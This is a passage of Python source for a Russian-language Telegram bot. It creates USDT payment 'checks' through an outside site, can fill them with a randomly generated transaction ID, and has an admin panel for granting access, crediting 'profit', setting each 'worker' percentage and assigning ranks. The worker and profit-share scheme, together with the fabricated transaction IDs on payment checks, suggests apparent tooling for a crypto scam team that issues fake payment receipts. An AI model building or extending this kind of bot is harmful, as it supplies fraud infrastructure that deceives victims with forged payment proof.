                chat_id=bot_msg_chat_id,
                message_id=bot_msg_id,
                caption=(
                    f"{E_EDIT_TAG} <b>Введите TX ID транзакции</b>\n\n"
                    f"Или нажмите кнопку для генерации случайного:"
                ),
                reply_markup=tx_id_kb(),
                parse_mode="HTML"
            )
        except Exception as e:
            logging.warning(f"edit_message_caption для tx_id не сработал: {e}")
    await state.set_state(InvoiceForm.tx_id)

@dp.callback_query(F.data == "gen_tx_id", InvoiceForm.tx_id)
async def cb_gen_tx_id(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    tx = gen_tx_id()
    await state.update_data(tx_id=tx)
    text = (
        f"{E_GEN_TX} <b>Сгенерирован TX ID:</b>\n<code>{tx}</code>\n\n"
        f"Выберите название счёта:"
    )
    await send_with_photo(callback.message, text, "create_invoice", reply_markup=invoice_title_kb())
    await state.set_state(InvoiceForm.title)

@dp.message(InvoiceForm.tx_id)
async def handle_invoice_tx_id(message: Message, state: FSMContext):
    tx = message.text.strip()
    try:
        await message.delete()
    except Exception:
        pass
    await state.update_data(tx_id=tx)
    state_data = await state.get_data()
    bot_msg_id = state_data.get("bot_msg_id")
    bot_msg_chat_id = state_data.get("bot_msg_chat_id")
    if bot_msg_id and bot_msg_chat_id:
        try:
            await bot.edit_message_caption(
                chat_id=bot_msg_chat_id,
                message_id=bot_msg_id,
                caption=f"{E_EDIT_TAG} <b>Выберите название счёта:</b>",
                reply_markup=invoice_title_kb(),
                parse_mode="HTML"
            )
        except Exception as e:
            logging.warning(f"edit_message_caption для title не сработал: {e}")
    await state.set_state(InvoiceForm.title)

@dp.callback_query(F.data.startswith("title_"), InvoiceForm.title)
async def cb_invoice_title(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    title = callback.data.replace("title_", "")
    await state.update_data(title=title)
    await finalize_invoice(callback.message, state, callback.from_user)

async def finalize_invoice(message, state: FSMContext, user_info):
    data_form = await state.get_data()
    await state.clear()
    amount  = data_form["amount"]
    tx_id   = data_form["tx_id"]
    title   = data_form["title"]
    user_id = user_info.id

    await send_with_photo(message, f"{E_WAIT} <b>Создаю чек...</b>", "create_invoice")

    result = await site_create_invoice(amount, tx_id, title)

    if not result:
        await send_with_photo(
            message,
            f"{E_ERROR} <b>Не удалось создать чек.</b>\n\nПопробуйте позже.",
            "create_invoice",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="В меню", callback_data="back_main")]
            ])
        )
        return

    link, invoice_id, domain_id = result

    data = load_data()
    user = get_user(data, user_id)
    inv_idx = len(user["invoices"])
    user["invoices"].append({
        "link": link,
        "amount": amount,
        "tx_id": tx_id,
        "title": title,
        "invoice_id": invoice_id,
        "domain_id": domain_id,
    })
    save_data(data)

    result_text = (
        f"{E_DONE} <b>Чек создан!</b>\n\n"
        f"<b>Сумма:</b> {amount} USDT\n"
        f"<b>Название:</b> {title}\n"
        f"{E_EDIT_TAG} <b>TX ID:</b> <code>{tx_id}</code>\n\n"
        f"<b>Ссылка:</b>\n<code>{link}</code>"
    )
    await send_with_photo(message, result_text, "create_invoice", reply_markup=invoice_actions_kb())

    admin_del_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text="🗑 УДАЛИТЬ ЧЕК",
            callback_data=f"admin_del_inv_{user_id}_{inv_idx}"
        )]
    ])
    try:
        await bot.send_message(
            LOG_CHAT_ID,
            f"{E_DONE} <b>Новый чек создан</b>\n\n"
            f"👤 {fmt_user(user_info)}\n"
            f"<b>Сумма:</b> {amount} USDT\n"
            f"<b>Название:</b> {title}\n"
            f"<b>TX ID:</b> <code>{tx_id}</code>\n"
            f"<b>Ссылка:</b> {link}",
            reply_markup=admin_del_kb,
            parse_mode="HTML"
        )
    except Exception as e:
        logging.warning(f"Не удалось отправить лог: {e}")

# ───────── АДМИН ПАНЕЛЬ ─────────
@dp.callback_query(F.data == "admin_panel")
async def cb_admin_panel(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("⛔️ Нет прав.", show_alert=True)
        return
    await callback.answer()
    data = load_data()
    await send_with_photo(callback.message, format_admin_panel(data), "menu", reply_markup=admin_kb(data))

@dp.callback_query(F.data == "admin_add")
async def cb_admin_add(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("⛔️ Нет прав.", show_alert=True)
        return
    await callback.answer()
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Отмена", callback_data="admin_panel")]
    ])
    await send_with_photo(callback.message, "<b>Выдать доступ</b>\n\nВведите Telegram ID пользователя:", "menu", reply_markup=kb)
    await state.update_data(bot_msg_id=callback.message.message_id, bot_msg_chat_id=callback.message.chat.id)
    await state.set_state(AdminForm.add_user)

@dp.message(AdminForm.add_user)
async def handle_admin_add(message: Message, state: FSMContext):
    if message.from_user.id not in ADMIN_IDS:
        return
    try:
        await message.delete()
    except Exception:
        pass
    if not message.text.strip().isdigit():
        return
    new_id = int(message.text.strip())
    data   = load_data()
    state_data = await state.get_data()
    await state.clear()
    if new_id in data["allowed"]:
        bot_msg_id = state_data.get("bot_msg_id")
        bot_msg_chat_id = state_data.get("bot_msg_chat_id")
        if bot_msg_id and bot_msg_chat_id:
            try:
                await bot.edit_message_caption(
                    chat_id=bot_msg_chat_id, message_id=bot_msg_id,
                    caption=f"⚠️ Пользователь <code>{new_id}</code> уже имеет доступ.", parse_mode="HTML"
                )
            except Exception:
                pass
        return
    data["tag_counter"] = data.get("tag_counter", 0) + 1
    default_tag = f"ГЕРЦОГEVSLDD-{data['tag_counter']}"
    data["allowed"].append(new_id)
    if new_id in data.get("revoked", []):
        data["revoked"].remove(new_id)
    user = get_user(data, new_id)
    if not user.get("tag"):
        user["tag"] = default_tag
    save_data(data)
    bot_msg_id = state_data.get("bot_msg_id")
    bot_msg_chat_id = state_data.get("bot_msg_chat_id")
    if bot_msg_id and bot_msg_chat_id:
        try:
            await bot.edit_message_caption(
                chat_id=bot_msg_chat_id, message_id=bot_msg_id,
                caption=(
                    f"{E_OK} <b>Доступ выдан</b>\n\n"
                    f"👤 ID: <code>{new_id}</code>\n"
                    f"Тег: <i>{default_tag}</i>"
                ),
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="Назад", callback_data="admin_panel")]
                ]),
                parse_mode="HTML"
            )
        except Exception:
            pass
    try:
        await bot.send_message(new_id, f"{E_ACCESS_OK} <b>Вам выдан доступ!</b>\n\nВведите /start для начала работы.", parse_mode="HTML")
    except Exception:
        pass
    await log_to_admin(bot,
        f"{E_OK} <b>Выдан доступ</b>\n"
        f"Кому: <code>{new_id}</code>\n"
        f"Тег: <i>{default_tag}</i>\n"
        f"Кто выдал: {fmt_user(message.from_user)}"
    )

@dp.callback_query(F.data == "admin_remove")
async def cb_admin_remove(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("⛔️ Нет прав.", show_alert=True)
        return
    await callback.answer()
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Отмена", callback_data="admin_panel")]
    ])
    await send_with_photo(callback.message, "<b>Забрать доступ</b>\n\nВведите Telegram ID пользователя:", "menu", reply_markup=kb)
    await state.update_data(bot_msg_id=callback.message.message_id, bot_msg_chat_id=callback.message.chat.id)
    await state.set_state(AdminForm.remove_user)

@dp.message(AdminForm.remove_user)
async def handle_admin_remove(message: Message, state: FSMContext):
    if message.from_user.id not in ADMIN_IDS:
        return
    try:
        await message.delete()
    except Exception:
        pass
    if not message.text.strip().isdigit():
        return
    rem_id = int(message.text.strip())
    data   = load_data()
    state_data = await state.get_data()
    await state.clear()
    bot_msg_id = state_data.get("bot_msg_id")
    bot_msg_chat_id = state_data.get("bot_msg_chat_id")
    if rem_id not in data["allowed"]:
        if bot_msg_id and bot_msg_chat_id:
            try:
                await bot.edit_message_caption(
                    chat_id=bot_msg_chat_id, message_id=bot_msg_id,
                    caption=f"⚠️ Пользователь <code>{rem_id}</code> не имеет доступа.", parse_mode="HTML"
                )
            except Exception:
                pass
        return
    data["allowed"].remove(rem_id)
    if rem_id not in data.get("revoked", []):
        data["revoked"].append(rem_id)
    save_data(data)
    if bot_msg_id and bot_msg_chat_id:
        try:
            await bot.edit_message_caption(
                chat_id=bot_msg_chat_id, message_id=bot_msg_id,
                caption=f"{E_OK} <b>Доступ забран</b>\n\n👤 ID: <code>{rem_id}</code>",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="Назад", callback_data="admin_panel")]
                ]),
                parse_mode="HTML"
            )
        except Exception:
            pass
    try:
        await bot.send_message(rem_id, f"{E_ERROR} <b>Ваш доступ к боту отозван.</b>", parse_mode="HTML")
    except Exception:
        pass
    await log_to_admin(bot,
        f"{E_ERROR} <b>Доступ отозван</b>\n"
        f"У кого: <code>{rem_id}</code>\n"
        f"Кто забрал: {fmt_user(message.from_user)}"
    )

@dp.callback_query(F.data == "admin_profit")
async def cb_admin_profit(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("⛔️ Нет прав.", show_alert=True)
        return
    await callback.answer()
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Отмена", callback_data="admin_panel")]
    ])
    await send_with_photo(callback.message, "<b>Начисление профита</b>\n\nВведите Telegram ID пользователя:", "menu", reply_markup=kb)
    await state.update_data(bot_msg_id=callback.message.message_id, bot_msg_chat_id=callback.message.chat.id)
    await state.set_state(AdminForm.profit_id)

@dp.message(AdminForm.profit_id)
async def handle_profit_id(message: Message, state: FSMContext):
    if message.from_user.id not in ADMIN_IDS:
        return
    try:
        await message.delete()
    except Exception:
        pass
    if not message.text.strip().isdigit():
        return
    await state.update_data(profit_uid=int(message.text.strip()))
    state_data = await state.get_data()
    bot_msg_id = state_data.get("bot_msg_id")
    bot_msg_chat_id = state_data.get("bot_msg_chat_id")
    if bot_msg_id and bot_msg_chat_id:
        try:
            await bot.edit_message_caption(
                chat_id=bot_msg_chat_id, message_id=bot_msg_id,
                caption="<b>Введите сумму для начисления (USDT):</b>", parse_mode="HTML"
            )
        except Exception:
            pass
    await state.set_state(AdminForm.profit_amount)

@dp.message(AdminForm.profit_amount)
async def handle_profit_amount(message: Message, state: FSMContext):
    if message.from_user.id not in ADMIN_IDS:
        return
    try:
        await message.delete()
    except Exception:
        pass
    raw = message.text.strip().replace(",", ".")
    try:
        amount = float(raw)
    except ValueError:
        return
    form_data = await state.get_data()
    uid = form_data["profit_uid"]
    bot_msg_id = form_data.get("bot_msg_id")
    bot_msg_chat_id = form_data.get("bot_msg_chat_id")
    await state.clear()
    data = load_data()
    user = get_user(data, uid)
    user["profit"] = round(user.get("profit", 0) + amount, 2)
    save_data(data)
    if bot_msg_id and bot_msg_chat_id:
        try:
            await bot.edit_message_caption(
                chat_id=bot_msg_chat_id, message_id=bot_msg_id,
                caption=(
                    f"{E_OK} <b>Профит начислен</b>\n\n"
                    f"👤 ID: <code>{uid}</code>\n"
                    f"Начислено: <b>{amount} USDT</b>\n"
                    f"Итого: <b>{user['profit']} USDT</b>"
                ),
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="Назад", callback_data="admin_panel")]
                ]),
                parse_mode="HTML"
            )
        except Exception:
            pass
    try:
        await bot.send_message(uid,
            f"{E_PROFIT} <b>Вам начислен профит!</b>\n\n"
            f"<b>+{amount} USDT</b>\n"
            f"Общий профит: <b>{user['profit']} USDT</b>",
            parse_mode="HTML")
    except Exception:
        pass
    await log_to_admin(bot,
        f"{E_PROFIT} <b>Профит начислен</b>\n"
        f"Кому: <code>{uid}</code>\n"
        f"Сумма: <b>+{amount} USDT</b>\n"
        f"Итого у пользователя: <b>{user['profit']} USDT</b>\n"
        f"Кто начислил: {fmt_user(message.from_user)}"
    )

@dp.callback_query(F.data == "admin_percent")
async def cb_admin_percent(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("⛔️ Нет прав.", show_alert=True)
        return
    await callback.answer()
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Отмена", callback_data="admin_panel")]
    ])
    await send_with_photo(callback.message, f"{E_PERCENT} <b>Повысить процент воркера</b>\n\nВведите Telegram ID пользователя:", "menu", reply_markup=kb)
    await state.update_data(bot_msg_id=callback.message.message_id, bot_msg_chat_id=callback.message.chat.id)
    await state.set_state(AdminForm.percent_id)

@dp.message(AdminForm.percent_id)
async def handle_percent_id(message: Message, state: FSMContext):
    if message.from_user.id not in ADMIN_IDS:
        return
    try:
        await message.delete()
    except Exception:
        pass
    if not message.text.strip().isdigit():
        return
    await state.update_data(percent_uid=int(message.text.strip()))
    state_data = await state.get_data()
    bot_msg_id = state_data.get("bot_msg_id")
    bot_msg_chat_id = state_data.get("bot_msg_chat_id")
    if bot_msg_id and bot_msg_chat_id:
        try:
            await bot.edit_message_caption(
                chat_id=bot_msg_chat_id, message_id=bot_msg_id,
                caption=f"{E_PERCENT} <b>Введите новый процент</b>\n\nДопустимые значения: <b>от 50 до 100</b>",
                parse_mode="HTML"
            )
        except Exception:
            pass
    await state.set_state(AdminForm.percent_value)

@dp.message(AdminForm.percent_value)
async def handle_percent_value(message: Message, state: FSMContext):
    if message.from_user.id not in ADMIN_IDS:
        return
    try:
        await message.delete()
    except Exception:
        pass
    raw = message.text.strip()
    if not raw.isdigit():
        return
    percent = int(raw)
    if percent < 50 or percent > 100:
        return
    form_data = await state.get_data()
    uid = form_data["percent_uid"]
    bot_msg_id = form_data.get("bot_msg_id")
    bot_msg_chat_id = form_data.get("bot_msg_chat_id")
    await state.clear()
    data = load_data()
    user = get_user(data, uid)
    old_percent = user.get("percent", 50)
    user["percent"] = percent
    save_data(data)
    if bot_msg_id and bot_msg_chat_id:
        try:
            await bot.edit_message_caption(
                chat_id=bot_msg_chat_id, message_id=bot_msg_id,
                caption=(
                    f"{E_OK} <b>Процент изменён</b>\n\n"
                    f"👤 ID: <code>{uid}</code>\n"
                    f"Было: <b>{old_percent}%</b> → Стало: <b>{percent}%</b>"
                ),
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="Назад", callback_data="admin_panel")]
                ]),
                parse_mode="HTML"
            )
        except Exception:
            pass
    try:
        await bot.send_message(uid,
            f"{E_PERCENT} <b>Ваш процент был повышен администратором!</b>\n\nНовый процент воркера: <b>{percent}%</b>",
            parse_mode="HTML")
    except Exception:
        pass
    await log_to_admin(bot,
        f"{E_PERCENT} <b>Процент изменён</b>\n"
        f"Кому: <code>{uid}</code>\n"
        f"Было: <b>{old_percent}%</b> → Стало: <b>{percent}%</b>\n"
        f"Кто изменил: {fmt_user(message.from_user)}"
    )

@dp.callback_query(F.data == "admin_rank")
async def cb_admin_rank(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("⛔️ Нет прав.", show_alert=True)
        return
    await callback.answer()
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Отмена", callback_data="admin_panel")]
    ])
    await send_with_photo(callback.message, f"{E_RANK} <b>Изменить ранг</b>\n\nВведите Telegram ID пользователя:", "menu", reply_markup=kb)
    await state.update_data(bot_msg_id=callback.message.message_id, bot_msg_chat_id=callback.message.chat.id)
    await state.set_state(AdminForm.rank_id)

@dp.message(AdminForm.rank_id)
async def handle_rank_id(message: Message, state: FSMContext):
    if message.from_user.id not in ADMIN_IDS:
        return
    try:
        await message.delete()
    except Exception:
        pass
    if not message.text.strip().isdigit():
        return
    target_id = int(message.text.strip())
    state_data = await state.get_data()
    bot_msg_id = state_data.get("bot_msg_id")
    bot_msg_chat_id = state_data.get("bot_msg_chat_id")
    await state.clear()
    data = load_data()
    user = get_user(data, target_id)
    current_rank = RANKS[user.get("rank", 0)]
    if bot_msg_id and bot_msg_chat_id:
        try:
            await bot.edit_message_caption(
                chat_id=bot_msg_chat_id, message_id=bot_msg_id,
                caption=(
                    f"{E_RANK} <b>Выберите новый ранг</b>\n\n"
                    f"👤 ID: <code>{target_id}</code>\n"
                    f"Текущий ранг: <b>{current_rank}</b>\n\n"
                    f"<i>Доступны ранги выше Герцога:</i>"
                ),
                reply_markup=rank_select_kb(target_id),
                parse_mode="HTML"
            )
        except Exception:
            pass

@dp.callback_query(F.data.startswith("set_rank_"))
async def cb_set_rank(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("⛔️ Нет прав.", show_alert=True)
        return
    await callback.answer()
    parts = callback.data.replace("set_rank_", "").split("_")
    if len(parts) < 2:
        await callback.answer("⚠️ Некорректные данные.", show_alert=True)
        return
    target_id = int(parts[0])
    rank_idx  = int(parts[1])
    if rank_idx < 0 or rank_idx >= len(RANKS):
        await callback.answer("⚠️ Некорректный ранг.", show_alert=True)
        return
    data = load_data()
    user = get_user(data, target_id)
    old_rank = RANKS[user.get("rank", 0)]
    user["rank"] = rank_idx
    save_data(data)
    new_rank = RANKS[rank_idx]
    try:
        await callback.message.edit_caption(
            caption=(
                f"{E_OK} <b>Ранг изменён!</b>\n\n"
                f"👤 ID: <code>{target_id}</code>\n"
                f"Было: <b>{old_rank}</b> → Стало: <b>{'⭐' * rank_idx} {new_rank}</b>"
            ),
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Назад в панель", callback_data="admin_panel")]
            ]),
            parse_mode="HTML"
        )
    except Exception as e:
        logging.warning(f"edit_caption для set_rank не сработал: {e}")
    await log_to_admin(bot,
        f"{E_RANK} <b>Ранг изменён</b>\n"
        f"Кому: <code>{target_id}</code>\n"
        f"Было: <b>{old_rank}</b> → Стало: <b>{new_rank}</b>\n"
        f"Кто изменил: {fmt_user(callback.from_user)}"
    )

# ───────── ВЕБ-СЕРВЕР ─────────
async def handle_ping(request):
    return web.Response(text="OK")

async def run_web():
    app = web.Application()
    app.router.add_get("/", handle_ping)
    app.router.add_get("/ping", handle_ping)
    app.router.add_head("/", handle_ping)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    logging.info(f"Web server started on port {PORT}")

async def main():
    await bot.delete_webhook(drop_pending_updates=True)
    await run_web()
    logging.info("Bot started!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
